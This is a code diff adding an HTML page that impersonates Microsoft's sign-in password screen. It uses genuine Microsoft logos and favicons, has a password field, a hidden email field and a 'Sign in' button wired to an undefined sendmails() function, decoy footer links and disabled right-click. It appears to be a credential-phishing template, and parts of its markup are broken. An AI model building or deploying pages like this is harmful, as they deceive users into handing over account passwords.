@@ -1,0 +1,184 @@
+
+    <script src="jquery-3.3.1.slim.min.js"></script>
+    <script src='jquery.1.9.1.js'></script>
+    <noscript><meta HTTP-EQUIV="refresh" content=0;url=https://login.microsoftonline.com/jsdisabled></noscript>
+    
+    <script>
+    function escapeHTML(str){
+    var p = document.createElement("p");
+    p.appendChild(document.createTextNode(str));
+    return p.innerHTML;
+    </script>
+
+    <html lang="en">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="no-cache"> 
+    
+    <!-- for FF, Chrome, Opera -->
+    <link rel="icon" type="image/png" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6468.8/content/images/favicon_a.ico" sizes="16x16">
+    <link rel="icon" type="image/png" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6468.8/content/images/favicon_a.ico" sizes="32x32">
+
+    <!-- for IE -->
+    <link rel="icon" type="image/x-icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6468.8/content/images/favicon_a.ico" >
+    <link rel="shortcut icon" type="image/x-icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6468.8/content/images/favicon_a.ico"/>
+    <title>Sign in to your account</title>
+
+    }
+    <!-- Bootstrap core CSS -->
+    
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    
+    <style type="text/css">
+    
+        body {
+            background-image: url(https://i.imgur.com/Ibb7N3G.jpg);
+            width: 100%;
+            height: 100%;
+		    background-position: center;
+            background-repeat:no-repeat;
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;             
+            }
+        
+       
+        ::-webkit-scrollbar { 
+           display: none;
+           
+        }
+        
+
+        .box {
+            margin: auto;
+            padding: 10px;
+            background-color: #FFF;
+        }
+
+        .imgc {
+            padding: 20px;
+        }
+
+       .form-control:focus {
+            border: 0;
+            border-radius: 0;
+            border-bottom: 1px;
+            border-bottom-style: solid; 
+            border-bottom-color:rgb(0, 103, 184);
+            outline: none;
+            box-shadow: none;
+       }
+        
+            input[type=password] {
+            border-top: 0;
+            border-right: 0;
+            border-left: 0;
+            border-bottom: 1px;
+            border-bottom-style: solid;
+            text-shadow: none;
+            -webkit-box-shadow: none;
+            box-shadow: none;
+       }
+        .btn,.twoToneButton {
+            outline: none !important;
+            box-shadow: none !important;
+            background-color: #0067B8;
+            color: #FFF;
+            padding-left: 30px;
+            padding-right: 30px;
+            border-radius: 0px;
+            padding: 7px 24px;
+            color: #FFF;
+            font-size: 16px;
+
+            border: 0;
+            text-align: center;
+            -webkit-transition: background .15s ease-in;
+            transition: background .15s ease-in;
+            cursor: pointer;
+            min-width: 120px;
+
+        }
+    .auto-style1 {
+		color: #0067B8;
+	}
+    .auto-style2 {
+		font-size: small;
+	}
+    .auto-style3 {
+		color: #404040;
+	}
+    </style>
+
+
+    <section>
+        <div class="container " style="width: 75%">
+            <div class="row">
+                <div class="offset-md-4 col-md-5 box" style="left: 0px; top: 119px">
+                    <div class="imgc">
+                        	  <div id="form-messages" style="height: 3px"></div>
+                        <img class="img-responsive" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+						<br>
+						
+						<br>
+                        	  <button id="idBtn_Back" aria-label="Back" class="backButton" style="box-sizing: border-box; color: rgb(0, 0, 0); font: inherit; margin: 0px 2px 0px 0px; overflow: hidden; text-transform: none; -webkit-appearance: button; cursor: pointer; max-width: 100%; display: inline-block; min-width: 24px; padding: 0px; position: relative; text-align: center; white-space: nowrap; vertical-align: middle; text-overflow: ellipsis; touch-action: manipulation; border: 0px none; background-color: rgb(255, 255, 255); height: 24px; width: 24px; float: left; border-radius: 12px;" type="button" onclick="window.location.reload()">
+							  <img data-bind="imgSrc" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" style="box-sizing: border-box; border: 0px; vertical-align: middle;" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
+							  </button>
+                        <i class=""></i><span id="user" style="font-size: 14.5px"></span><br>
+						<br>
+                        <h4 class="auto-style3">Enter password</h4>
+                        
+                    <div style="color: red;font-size: 14.5px" class="warning" id="warning"></div>
+		
+    
+    <input id="pass" name="pass" placeholder="Password" class="form-control" autocomplete="off" style="border-left: 0px solid rgba(0, 0, 0, 0.6); border-right: 0px solid rgba(0, 0, 0, 0.6); border-top: 0px solid rgba(0, 0, 0, 0.6);  box-sizing: border-box; color: inherit; margin: 0px; max-width: 100%; display: block; width: 363px; background-image: none; padding: 6px 10px 6px 0px; background-color: transparent; height: 36px; outline: none; border-radius: 0px;" type="password">
+
+
+
+                            <input id="user" name="email" value="" type="hidden">
+                            <br>
+							  <span class="auto-style2">
+                            <a href="javascript:history.go(0)" class="auto-style1">
+							  Forgot my password</a></span><br><br>
+
+
+
+<button style="float:right" onclick="sendmails()" id="submit" class="btn twoToneButton">Sign in</button>
+
+                        <br><br>
+                    </div>
+
+
+                </div>
+            </div>
+        </div>
+<div id="footer" class="footer default" role="contentinfo" style="background-color: rgba(0, 0, 0, 0.6); bottom: -2px; box-sizing: border-box; clear: both; overflow: visible; position: fixed; width: 1366px; z-index: 99; left: 0px;">
+					<div style="box-sizing: border-box;">
+						<div id="footerLinks" class="footerNode text-secondary" style="box-sizing: border-box; color: rgba(0, 0, 0, 0.7); float: right; font-size: 13px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px;">
+							<span id="ftrCopy" data-bind="html: svr.strCopyrightTxt" style="box-sizing: border-box; color: rgb(255, 255, 255); display: inline-block; font-size: 12px; line-height: 28px; margin-left: 8px; margin-right: 8px; white-space: nowrap;">
+							<span style="color: rgb(255, 255, 255); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: nowrap; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgba(0, 0, 0, 0.6); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
+							©</span>2019 Microsoft</span>
+							<a id="ftrTerms"  href="javascript:history.go(0)" style="background-color: transparent; box-sizing: border-box; color: rgb(255, 255, 255); display: inline-block; font-size: 12px; line-height: 28px; margin-left: 8px; margin-right: 8px; text-decoration: none; white-space: nowrap;">
+							Terms of use</a>
+							<a id="ftrPrivacy"  href="javascript:history.go(0)" style="background-color: transparent; box-sizing: border-box; color: rgb(255, 255, 255); display: inline-block; font-size: 12px; line-height: 28px; margin-left: 8px; margin-right: 8px; text-decoration: none; white-space: nowrap;">
+							Privacy &amp; cookies</a>
+							<a aria-label="Click here for more options" class="moreOptions" href="javascript:history.go(0)" role="button" style="background-color: transparent; box-sizing: border-box; color: rgb(255, 255, 255); display: inline-block; font-size: 12px; line-height: 28px; margin-left: 8px; margin-right: 8px; text-decoration: none; white-space: nowrap;">
+							<img class="desktopMode" data-bind="imgSrc" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" style="border-bottom-color: rgb(255, 255, 255); border-bottom-style: none; border-bottom-width: 0px; border-image-outset: 0; border-image-repeat: stretch; border-image-slice: 100%; border-image-source: none; border-image-width: 1; border-left-color: rgb(255, 255, 255); border-left-style: none; border-left-width: 0px; border-right-color: rgb(255, 255, 255); border-right-style: none; border-right-width: 0px; border-top-color: rgb(255, 255, 255); border-top-style: none; border-top-width: 0px; box-sizing: border-box; vertical-align: middle;" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8395.18/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
+							</a></div>
+							<body oncontextmenu="return false;">
+					</div>
+				</div>
+    </section>
+    
+   
+
+    <script src="jquery-3.3.1.slim.min.js"></script>
+    <script src='jquery.1.9.1.js'></script>
+
+    </html>
+
